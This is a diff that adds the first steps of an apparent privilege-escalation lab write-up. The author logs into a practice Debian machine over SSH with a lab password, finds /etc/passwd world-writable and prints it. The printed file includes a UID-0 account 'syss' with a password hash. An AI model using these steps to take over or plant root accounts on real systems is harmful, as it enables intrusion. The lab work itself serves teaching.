@@ -90,3 +90,95 @@ Got a full root shell
                         ↓
                 whoami → root
 ```
+
+## Step 1 — Connecting to the Target via SSH
+
+```bash
+ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa user@192.168.5.133
+```
+
+- `-o HostKeyAlgorithms=+ssh-rsa` : Allows older RSA host key algorithm — needed for older Linux systems
+- `-o PubkeyAcceptedAlgorithms=+ssh-rsa` : Allows older RSA public key algorithm for authentication
+- `192.168.5.133` : Target IP
+- `user`: User Name
+
+**Output:**
+
+```
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+user@192.168.5.133's password: 
+Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Jun 30 12:32:04 2026 from 192.168.5.128
+```
+It prompted for the password right after the connection request, I typed `password321`, and got logged in successfully. The kernel version 2.6.32 stood out right away.
+
+I logged in as `user` — a normal low privilege account on the system.
+
+<p align="center">
+  <img src="images/step1-1.png" width="600">
+</p>
+
+## Step 2 — Checking /etc/passwd Permissions
+
+```bash
+user@debian:~$ ls -la /etc/passwd
+```
+**Output:**
+
+```
+-rw-r--rw- 1 root root 1074 Jan 14 11:17 /etc/passwd
+```
+### Breakdown
+
+```
+| Permission | Who           | What it means               |
+|------------|---------------|-----------------------------|
+|   rw-      | root (owner)  | Root can read and write     |
+|   r--      | root (group)  | Group can only read         |
+|   rw-      | Others        | Everyone can read and write |
+```
+The last `rw-` was the problem. Any normal user on the system — including me — could write directly to `/etc/passwd`. This was a serious misconfiguration.
+
+### Read the Current Contents
+
+```bash
+user@debian:~$ cat /etc/passwd
+```
+**Output:**
+
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+syss:$1$n1dAk/CX$ZUkgI8Q8i9wC6eh9LlWy/1:0:0:root:/root:/bin/bash
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+Debian-exim:x:101:103::/var/spool/exim4:/bin/false
+sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
+user:x:1000:1000:user,,,:/home/user:/bin/bash
+statd:x:103:65534::/var/lib/nfs:/bin/false
+mysql:x:104:106:MySQL Server,,,:/var/lib/mysql:/bin/false
+```
